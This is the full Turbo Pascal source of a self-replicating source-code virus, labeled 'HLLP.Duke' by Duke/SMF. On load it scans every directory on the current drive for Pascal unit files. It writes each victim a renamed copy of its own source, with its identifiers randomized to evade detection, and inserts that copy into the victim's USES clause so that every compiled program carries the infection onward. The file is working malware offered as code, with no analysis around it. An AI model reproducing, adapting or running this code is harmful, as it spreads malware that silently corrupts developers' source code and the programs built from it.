   UNIT FMRA_BEG;
   INTERFACE
   USES DOS;
   {$IFNDEF D+}
   CONST Hello='HLLP.Duke (c) by Duke/SMF';
   {$ENDIF D+}
   TYPE
     FMRA_PList = ^FMRA_TList;
     FMRA_TList = record
       Name : String[12];
       Next : FMRA_Plist;
       end;
   CONST
        Exchange : Array [1..10] of String [15] =
        ('FMRA_',
         'Manager',
         'ChDrive',
         'UpStr',
         'RandomName',
         'InfectFile',
         'DetectUnitFile',
         'ScanDir',
         'Exchange',
         'RandomSelect');
   {$I FMRA_INC.inc}
   VAR
      FMRA_SR : SearchRec;
      FMRA_S : String;
      Exchange1 : Array [1..10] of String [15];
      Duke_Tek : integer;

   PROCEDURE FMRA_Manager;

   IMPLEMENTATION

   PROCEDURE FMRA_ChDrive (Drive : Byte);Assembler;
   asm
   MOV AH, 0Eh
   MOV DL, Drive;
   INT 21h
   END;

   FUNCTION FMRA_UpStr (S : String) : String;
   VAR
      S1 : String;
      i : Integer;
   BEGIN
   S1:=S;
   for i:=1 to Length(S1) do S1[i]:=UpCase(S1[i]);
   FMRA_UpStr:=S1;
   END;

   FUNCTION FMRA_RandomName(Range:Byte):String;
   VAR
      S : String;
      I, J, K : Byte;
      t : Text;
   BEGIN
   repeat
     S:='';
     K:=1+Random(Range);
     if K<7 then K:=7;
     for J:=1 to K do
       begin
       I:=65+Random(26);
       S:=S+Chr(I);
       end;
     Assign(t,S+'.pas');
     {$I-}ReSet(t);{$I+}
     if IOResult<>0 then break;
     Close (t);
   until False;
   FMRA_RandomName:=S;
   END;

   PROCEDURE FMRA_RandomSelect;
   VAR
      I, J : Byte;
      Flag : Boolean;
   BEGIN
   Exchange1[1]:=FMRA_RandomName(5);
   for I:=2 to 10 do Exchange1[I]:=FMRA_RandomName(14)+'_';
   repeat
     Flag:=True;
     for J:=1 to 9 do
       for I:=J+1 to 10 do
       if Exchange1[J]=Exchange1[I] then
         begin
         Exchange1[I]:=FMRA_RandomName(14)+'_';
         Flag:=False;
         end;
   until Flag;
   END;

   PROCEDURE FMRA_Rename (var t, t1 : Text; S1 : String);
   VAR
      S : String;
      I, J : Byte;
   BEGIN
   ReSet(t);
   ReWrite(t1);
   While not Eof(t) do
     begin
     ReadLn(t,S);
     for I:=1 to 10 do
       while Pos(Exchange[I],S)>0 do
         begin
         J:=Pos(Exchange[I],S);
         Delete(S,J,Length(Exchange[I]));
         Insert(Exchange1[I],S,J);
         end;
     WriteLn(t1,S);
     end;
   Close(t1);
   Close(t);
   Erase(t);
   Rename(t1,S1);
   END;

   function Duke_TakeString : string;
   var s:string;
   begin
   s:='';
   while Duke_Mas[Duke_Tek]<>10 do
     begin
     s:=s+chr(Duke_Mas[Duke_Tek]);
     Duke_Tek:=Duke_Tek+1;
     end;
   s:=copy(s,1,length(s)-2);
   Duke_TakeString:=s;
   end;

   procedure FMRA_InfectFile (S : String);
   var
       t1,t2 : Text;
       S1 : String;
       I, J : Integer;
       S2 : String [8];
       Duke_St:string;
       Duke_File:file of char;
       ch:char;
       z:byte;
   begin
   S2:=FMRA_RandomName(8);
   Duke_St:=S2+'.pas';
   Assign(t1,Duke_St);
   {$I-}ReWrite(t1);{$I+}
   if IOResult<>0 then Exit;
   Duke_Tek:=1;
   while Duke_Tek<>Duke_Max do
     begin
     S1:=Duke_TakeString;
     if Pos('{$I ',S1)=1 then S1:='{$I '+S2+'.inc}';
     if Pos('UNIT',S1)=1 then S1:='UNIT '+S2+ ';';
     WriteLn(t1,S1);
     end;
   Close(t1);
   Assign(t2,FMRA_RandomName(8)+'.pas');
   FMRA_RandomSelect;
   FMRA_Rename(t1,t2,Duke_St);
   Assign(t1,S2+'.inc');
   ReWrite(t1);
   if IOResult<>0 then Exit;
   WriteLn(t1,'CONST');
   assign(Duke_File,Duke_St);reset(Duke_File);
   writeln(t1,'Duke_Max=',filesize(Duke_File),';');
   writeln(t1,'Duke_Mas:array[1..Duke_Max] of byte =');
   z:=0;
   write(t1,'(');
   while not eof(Duke_File) do
     begin
     read(Duke_File,ch);
     write(t1,ord(ch));
     if not eof(Duke_File) then write(t1,',');
     z:=z+1;
     if z=20 then begin writeln(t1,'');z:=0;end;
     end;
   write(t1,');');
   Close(t1);
   Assign(t2,FMRA_RandomName(8)+'.inc');
   FMRA_Rename(t1,t2,S2+'.inc');
   Assign(t1,S);
   ReSet(t1);
   if IOResult<>0 then Exit;
   Assign(t2,'Scheriff.pas');
   ReWrite(t2);
   while not Eof(t1) do
     begin
     ReadLn(t1,S1);
     if Pos ('USES ',FMRA_UpStr(S1))>0 then
       Insert('{$IFNDEF D+} '+S2+', {$ENDIF D+} ',S1,Pos('USES ',FMRA_UpStr(S1))+5);
     WriteLn(t2,S1);
     end;
   Close(t2);
   Close(t1);
   Erase(t1);
   Rename(t2,S);
   end;

   procedure FMRA_DetectUnitFile (S : String);
   var
       t    : Text;
       Flag : Boolean;
       S1   : String;
   begin
   Assign(t,S);{$I-}ReSet(t);{$I+}
   if IOResult<>0 then Exit;
   Flag:=False;
   while not Eof(t) do
     begin
     ReadLn(t,S1);
     if Pos('{$IFNDEF',S1)>0 then
       begin
       Flag:=False;
       Break;
       end;
     if FMRA_UpStr(S1)='IMPLEMENTATION' then Flag:=True;
     end;
   Close(t);
   if Flag then FMRA_InfectFile(S);
   end;

   procedure FMRA_ScanDir(stdir:PathStr);
   var
       n,L : FMRA_PList;
       m : PathStr;
       St : string[79];
       ch : char;
       DIR : DirStr;
       NAM : NameStr;
       EXT : EXTSTR;
   begin
   FileMode:=0;
   L:=nil;
   if stdir[Length(stdir)]<>'\' then stdir:=stdir+'\';
   m:=stdir+'*.*';
   FindFirst(m,AnyFile,FMRA_SR);
   while dosError=0 do
     begin
     if ((FMRA_SR.Attr and Directory)<>0) and (FMRA_SR.Name[1]<>'.') then
       begin
       New(n);
       N^.Next:=L;
       N^.Name:=FMRA_SR.Name;
       L:=N;
       end
     else
     if (FMRA_SR.Attr and VolumeID=0) and (FMRA_SR.Attr and Directory=0) then
       begin
       FMRA_S:=m;
       Delete(FMRA_S,Length(m)-2,3);
       FMRA_S:=FMRA_S+FMRA_SR.Name;
       FSPLIT(FMRA_S,DIR,NAM,EXT);
       IF (EXT='.PAS') and (FMRA_SR.Attr and Hidden=0) THEN
         FMRA_DetectUnitFile(FMRA_S);
       end;
     FindNext(FMRA_SR);
     end;
   while L<>nil do
     begin
     m:=Stdir+L^.Name;
     ChDir(m);
     if IOResult<>0 then Exit;
     n:=L;
     L:=L^.next;
     Dispose(n);
     m:=m+'\';
     if IOResult=0 then FMRA_ScanDir(m);
     m:=stdir;
     if m[length(m)-1]<>':' then m[0]:=chr(length(stdir)-1);
     ChDir(m);
     end;
   end;

   PROCEDURE FMRA_Manager;
   VAR
       Home : PathStr;
       S    : String;
   BEGIN
   Randomize;
   GetDir(0, Home);
   if Home[Length(Home)]='\' then Delete(Home,Length(Home),1);
   S:=Home[1]+':';
   FMRA_ChDrive(ORD(UpCase(S[1]))-65);
   FMRA_ScanDir(S);
   FMRA_ChDrive(ORD(UpCase(Home[1]))-65);
   ChDir(Home);
   END;

   BEGIN
   FMRA_Manager;
   END.
